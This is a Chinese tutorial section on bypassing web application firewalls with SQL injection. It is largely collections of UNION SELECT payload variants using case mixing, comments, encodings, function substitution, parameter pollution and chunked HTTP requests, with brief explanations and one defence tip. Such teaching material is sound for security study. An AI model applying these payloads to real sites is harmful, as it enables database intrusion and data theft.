# SQL注入WAF绕过

### 2.1 大小写绕过

最基础的绕过方式，利用SQL关键字大小写不敏感的特性：

```sql
-- 原始Payload
UNION SELECT 1,2,3--

-- 大小写变形
UnIoN SeLeCt 1,2,3--
uNiOn sElEcT 1,2,3--
UNiOn SeLEcT 1,2,3--
```

**原理：** SQL关键字不区分大小写，但部分WAF规则仅匹配特定大小写组合。

**防御：** WAF规则应对SQL关键字做大小写不敏感匹配（`(?i)union`）。

### 2.2 注释绕过

利用SQL注释语法拆分关键字：

```sql
-- 内联注释拆分
UN/**/ION SE/**/LECT 1,2,3--
UNI/**/ON SEL/**/ECT 1,2,3--

-- MySQL特有内联注释
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3--

-- 多行注释
UN/*comment*/ION SE/*comment*/LECT 1,2,3--

-- 换行注释
UNION%0aSELECT 1,2,3--
```

**原理：** MySQL的`/**/`注释会被SQL引擎忽略，但部分WAF可能不正确处理注释，导致关键字被拆分后无法匹配。

**MySQL版本号注释：** `/*!50000 ...*/` 表示MySQL 5.00.00以上版本执行其中的SQL。

### 2.3 编码绕过

#### 2.3.1 URL编码

```
原始: UNION SELECT
URL编码: %55NION %53ELECT
双重编码: %2555NION %2553ELECT
```

**双重编码绕过原理：** 某些应用在解码一次URL编码后传给WAF，WAF不解码或解码一次，而后端再次解码，导致WAF看到的不是关键字。

#### 2.3.2 十六进制编码

```sql
-- 字符串十六进制
SELECT * FROM users WHERE name=0x61646d696e  -- 'admin'

-- CHAR()函数
SELECT * FROM users WHERE name=CHAR(97,100,109,105,110)  -- 'admin'
```

#### 2.3.3 Unicode编码

```sql
-- Unicode编码
UNION SELECT → %u0055NION %u0053ELECT

-- 利用IIS Unicode解码特性
```

### 2.4 等价函数绕过

利用功能等价的函数替换被WAF拦截的函数：

```
等价替换表:
┌────────────────┬───────────────────────────────┐
│ 被拦截函数     │ 等价替代                       │
├────────────────┼───────────────────────────────┤
│ UNION SELECT   │ UNION ALL SELECT              │
│ UNION SELECT   │ UNION DISTINCT SELECT         │
│ SUBSTRING()    │ MID()/SUBSTR()/LEFT()/RIGHT() │
│ ASCII()        │ ORD()/HEX()/CONV()            │
│ CONCAT()      │ CONCAT_WS()/GROUP_CONCAT()    │
│ SLEEP()       │ BENCHMARK()/GET_LOCK()        │
│ @@version     │ version()                     │
│ USER()        │ CURRENT_USER()/SESSION_USER() │
│ DATABASE()    │ SCHEMA()                      │
│ IF()          │ CASE WHEN ... THEN ... END    │
│ LIMIT 0,1     │ LIMIT 1 OFFSET 0              │
└────────────────┴───────────────────────────────┘
```

**示例：**

```sql
-- 原始（被拦截）
UNION SELECT 1,user(),3--

-- 等价替换
UNION SELECT 1,current_user(),3--
UNION SELECT 1,session_user(),3--
UNION SELECT 1,concat(user(),' '),3--
```

### 2.5 内联注释绕过

MySQL特有的内联注释`/*!...*/`可以在注释中嵌入SQL语句：

```sql
-- 内联注释执行SQL
/*!50000UNION*//*!50000SELECT*/ 1,2,3--

-- 结合版本号
/*!50000UniON*//*!50000SeLeCt*/ 1,user(),3--

-- 利用版本号差异
/*!00000UNION SELECT*/ 1,2,3--  -- 0版本号使所有MySQL执行
```

### 2.6 空格绕过

WAF可能依赖空格来分割SQL关键字，可用替代字符绕过：

```
空格替代字符:
├── Tab         %09  (制表符)
├── 换行        %0a  (LF)
├── 回车        %0d  (CR)
├── 换行+回车   %0d%0a (CRLF)
├── 垂直制表符  %0b
│   换页符      %0c
├── 注释        /**/
├── 括号        ()
└── 加号        + (在URL中)
```

```sql
-- 空格替代示例
UNION%0aSELECT 1,2,3--
UNION%09SELECT%091,2,3--
UNION/**/SELECT/**/1,2,3--
UNION(SELECT 1,2,3)--
```

### 2.7 HTTP参数污染（HPP）

利用前后端对同名参数处理方式的差异：

```
-- HPP绕过
GET /search.php?id=1&id=UNION+SELECT+1,2,3 HTTP/1.1

-- 不同后端处理:
PHP:        取最后一个 → id=UNION SELECT 1,2,3
ASP.NET:    用逗号拼接 → id=1,UNION SELECT 1,2,3
JSP:        取第一个 → id=1
Python:     取第一个 → id=1
```

**绕过原理：** WAF可能只检查其中一个参数值或拼接后检查，但后端实际使用的值与WAF检查的值不同。

**分割Payload：**

```
GET /search.php?id=1/**/&id=**/UNION/**/&id=**/SELECT/**/&id=**/1,2,3 HTTP/1.1
-- WAF分别检查各参数值，看似无害
-- 后端拼接后: 1/**/**/UNION/**/**/SELECT/**/**/1,2,3
```

### 2.8 分块传输绕过

利用HTTP/1.1的Transfer-Encoding: chunked分块传输请求体：

```
POST /search.php HTTP/1.1
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

5
id=1%
6
20UNI
6
ON SEL
5
ECT 
5
1,2,3
0

```

**原理：** 部分WAF不正确处理分块传输，只在完整请求体中匹配，而分块后的请求被后端重组执行。WAF可能看到的是碎片化的内容，无法匹配完整特征。

### 2.9 综合绕过示例

```sql
-- 目标: 构造UNION SELECT绕过WAF
-- 原始Payload: UNION SELECT 1,user(),3

-- 综合变形1: 编码+注释+等价函数
%55NION/**/SeLeCt/**/1,current_user%28%29,3--

-- 综合变形2: 内联注释+空格替代+等价函数
/*!50000UNiOn*//*!50000SeLeCt*/%0a1,session_user%28%29,3%23

-- 综合变形3: HPP+编码
id=1&id=UNI&id=ON+SELE&id=CT+1,2,3

-- 综合变形4: 双重编码+等价
%2555NION+%2553ELECT+1,SCHEMA%28%29,3
```

---

---

## 📋 内容审核与补充建议

> 针对「SQL注入WAF绕过」部分的内容审核结果：

### 🔧 工具推荐
- ⚠️ 缺少tools相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
